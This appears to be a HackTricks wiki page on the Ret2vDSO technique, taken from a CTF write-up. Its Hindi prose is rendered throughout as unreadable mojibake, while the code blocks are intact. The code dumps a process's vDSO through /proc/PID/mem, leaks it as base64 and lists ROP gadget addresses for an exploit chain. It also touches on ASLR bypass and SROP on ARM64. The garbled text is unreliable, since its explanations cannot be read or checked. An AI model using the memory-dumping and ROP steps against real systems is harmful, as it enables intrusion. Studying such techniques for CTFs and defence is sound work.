# Ret2vDSO

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§™‡•ç‡§∞‡•à‡§ï‡•ç‡§ü‡§ø‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks ‡§™‡•ç‡§∞‡§∂‡§ø‡§ï‡•ç‡§∑‡§£ AWS ‡§∞‡•á‡§° ‡§ü‡•Ä‡§Æ ‡§è‡§ï‡•ç‡§∏‡§™‡§∞‡•ç‡§ü (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§™‡•ç‡§∞‡•à‡§ï‡•ç‡§ü‡§ø‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks ‡§™‡•ç‡§∞‡§∂‡§ø‡§ï‡•ç‡§∑‡§£ GCP ‡§∞‡•á‡§° ‡§ü‡•Ä‡§Æ ‡§è‡§ï‡•ç‡§∏‡§™‡§∞‡•ç‡§ü (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>‡§π‡•à‡§ï‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç**](https://github.com/sponsors/carlospolop) ‡§ï‡•Ä ‡§ú‡§æ‡§Å‡§ö ‡§ï‡§∞‡•á‡§Ç!
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ ‡§™‡§∞ **‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç, ‡§π‡•à‡§ï‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ‡§∞‡•á‡§™‡•ã ‡§Æ‡•á‡§Ç PR ‡§ú‡§Æ‡§æ ‡§ï‡§∞‡§ï‡•á.

</details>
{% endhint %}

## ‡§Æ‡•Ç‡§≤ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä

‡§µ‡•Ä‡§°‡•Ä‡§è‡§∏‡§ì ‡§ï‡•ç‡§∑‡•á‡§§‡•ç‡§∞ ‡§Æ‡•á‡§Ç **‡§ó‡•à‡§ú‡•á‡§ü‡•ç‡§∏** ‡§π‡•ã ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§ú‡•ã ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§Æ‡•ã‡§° ‡§∏‡•á ‡§ï‡§∞‡•ç‡§®‡•á‡§≤ ‡§Æ‡•ã‡§° ‡§Æ‡•á‡§Ç ‡§¨‡§¶‡§≤‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§è ‡§ú‡§æ‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡•á ‡§ö‡•Å‡§®‡•å‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§Æ‡•á‡§Ç, ‡§Ü‡§Æ ‡§§‡•å‡§∞ ‡§™‡§∞ ‡§è‡§ï ‡§ï‡§∞‡•ç‡§®‡•á‡§≤ ‡§õ‡§µ‡§ø ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§µ‡•Ä‡§°‡•Ä‡§è‡§∏‡§ì ‡§ï‡•ç‡§∑‡•á‡§§‡•ç‡§∞ ‡§ï‡•ã ‡§°‡§Ç‡§™ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§

[https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/) ‡§∏‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡§æ ‡§™‡§æ‡§≤‡§® ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è ‡§¶‡•á‡§ñ‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§µ‡•Ä‡§°‡•Ä‡§è‡§∏‡§ì ‡§∏‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§°‡§Ç‡§™ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§•‡§æ ‡§î‡§∞ ‡§á‡§∏‡•á ‡§π‡•ã‡§∏‡•ç‡§ü ‡§™‡§∞ ‡§≤‡•á ‡§ú‡§æ‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§•‡§æ‡•§
```bash
# Find addresses
cat /proc/76/maps
08048000-08049000 r--p 00000000 00:02 317                                /target
08049000-0804a000 r-xp 00001000 00:02 317                                /target
0804a000-0804b000 rw-p 00002000 00:02 317                                /target
f7ff8000-f7ffc000 r--p 00000000 00:00 0                                  [vvar]
f7ffc000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

# Dump it
dd if=/proc/76/mem of=vdso bs=1 skip=$((0xf7ffc000)) count=$((0x2000))
8192+0 records in
8192+0 records out
8192 bytes (8.0KB) copied, 0.901154 seconds, 8.9KB/s

# Compress and leak it
gzip vdso
base64 vdso.gz

# Decompress and check of gadgets
echo '<base64-payload>' | base64 -d | gzip -d - > vdso
file vdso
ROPgadget --binary vdso | grep 'int 0x80'
```
ROP ‡§ó‡•à‡§ú‡•á‡§ü‡•ç‡§∏ ‡§Æ‡§ø‡§≤‡•á:
```python
vdso_addr = 0xf7ffc000

int_0x80_xor_eax_eax_ret_addr = 0x8049010
bin_sh_addr = 0x804a800

# 0x0000057a : pop edx ; pop ecx ; ret
pop_edx_pop_ecx_ret_addr = vdso_addr + 0x57a

# 0x00000cca : mov dword ptr [edx], ecx ; add esp, 0x34 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
mov_dword_ptr_edx_ecx_ret_addr = vdso_addr + 0xcca

# 0x00000ccb : or al, byte ptr [ebx + 0x5e5b34c4] ; pop edi ; pop ebp ; ret
or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr = vdso_addr + 0xccb

# 0x0000015cd : pop ebx ; pop esi ; pop ebp ; ret
pop_ebx_pop_esi_pop_ebp_ret = vdso_addr + 0x15cd
```
{% hint style="danger" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ø‡§¶‡§ø ‡§ï‡§∞‡•ç‡§®‡•á‡§≤ CONFIG\_COMPAT\_VDSO ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ï‡•â‡§Æ‡•ç‡§™‡§æ‡§á‡§≤ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à, ‡§§‡•ã **vdso ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ASLR ‡§ï‡•ã ‡§õ‡§≤‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à** ‡§Ø‡§¶‡§ø vdso ‡§™‡§§‡§æ ‡§Ø‡§æ‡§¶‡•É‡§ö‡•ç‡§õ‡§ø‡§ï ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§ó‡§æ: [https://vigilance.fr/vulnerability/Linux-kernel-bypassing-ASLR-via-VDSO-11639](https://vigilance.fr/vulnerability/Linux-kernel-bypassing-ASLR-via-VDSO-11639)
{% endhint %}

### ARM64

‡§ï‡§æ‡§≤‡•Ä 2023.2 arm64 ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•á vdso ‡§ñ‡§Ç‡§° ‡§ï‡•ã ‡§°‡§Ç‡§™ ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§ú‡§æ‡§Ç‡§ö‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶, ‡§Æ‡•Å‡§ù‡•á ‡§µ‡§π‡§æ‡§Ç ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§ó‡•à‡§ú‡•á‡§ü ‡§®‡§π‡•Ä‡§Ç ‡§Æ‡§ø‡§≤‡§æ (‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§Æ‡§æ‡§®‡•ã‡§Ç ‡§∏‡•á ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡§∞ ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§ï‡•ã‡§à ‡§§‡§∞‡•Ä‡§ï‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§•‡§æ ‡§Ø‡§æ x30 ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∞‡§ø‡§ü) **‡§ï‡•á‡§µ‡§≤ SROP ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡•á ‡§ï‡§æ ‡§è‡§ï ‡§§‡§∞‡•Ä‡§ï‡§æ** ‡§π‡•à‡•§ ‡§™‡•á‡§ú ‡§∏‡•á ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§¶‡•á‡§ñ‡•á‡§Ç:

{% content-ref url="srop-sigreturn-oriented-programming/srop-arm64.md" %}
[srop-arm64.md](srop-sigreturn-oriented-programming/srop-arm64.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks ‡§™‡•ç‡§∞‡§∂‡§ø‡§ï‡•ç‡§∑‡§£ AWS ‡§∞‡•á‡§° ‡§ü‡•Ä‡§Æ ‡§è‡§ï‡•ç‡§∏‡§™‡§∞‡•ç‡§ü (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks ‡§™‡•ç‡§∞‡§∂‡§ø‡§ï‡•ç‡§∑‡§£ GCP ‡§∞‡•á‡§° ‡§ü‡•Ä‡§Æ ‡§è‡§ï‡•ç‡§∏‡§™‡§∞‡•ç‡§ü (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç**](https://github.com/sponsors/carlospolop) ‡§ï‡•Ä ‡§ú‡§æ‡§Ç‡§ö ‡§ï‡§∞‡•á‡§Ç!
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç, ‡§π‡•à‡§ï‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ‡§∞‡•á‡§™‡•ã ‡§Æ‡•á‡§Ç PR ‡§ú‡§Æ‡§æ ‡§ï‡§∞‡§ï‡•á‡•§

</details>
{% endhint %}
